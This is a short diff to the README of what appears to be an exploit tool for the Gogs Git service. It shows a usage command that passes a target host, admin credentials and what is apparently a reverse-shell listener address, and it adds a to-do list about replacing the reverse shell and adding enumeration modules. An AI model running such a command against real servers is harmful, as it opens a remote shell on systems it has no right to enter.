@@ -37,3 +37,6 @@ options:
 ```bash
 /gogs.py -s 192.168.1.24:8000 -u admin -p 'Password1234' -t false -r 192.168.45.5:80
 ```
+## To-Do
+- HTTP Interaction over Internet instead of Reverse Shell
+- More enumeration modules ...
